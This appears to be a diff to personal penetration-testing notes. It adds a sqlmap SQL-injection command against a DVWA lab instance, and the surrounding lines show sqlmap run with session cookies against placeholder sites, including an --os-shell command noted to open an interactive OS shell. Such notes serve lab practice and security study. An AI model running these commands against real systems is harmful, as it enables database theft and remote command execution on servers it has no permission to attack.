@@ -30,6 +30,13 @@ sqlmap -u "http://www.text.com/viewpr.aspx?id=1" --cookie="mscope=1jwuydl=; ui-t
 
 
 
+# my test on DVWA 
+
+sqlmap -u  "http://10.10.10.10/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="PHPSESSID=ba1701e99d5e4aae0627b2ab50e0dd5e;security=low" 
+
+
+
+
 sqlmap -u http://www.test.com/viewprofile.aspx?id=1" --cookie="msco==; ui-tabs-1=0" --os-shell
 #It opens up the Interactive OS shell.
 # if ask Y THEN Y THEN Y
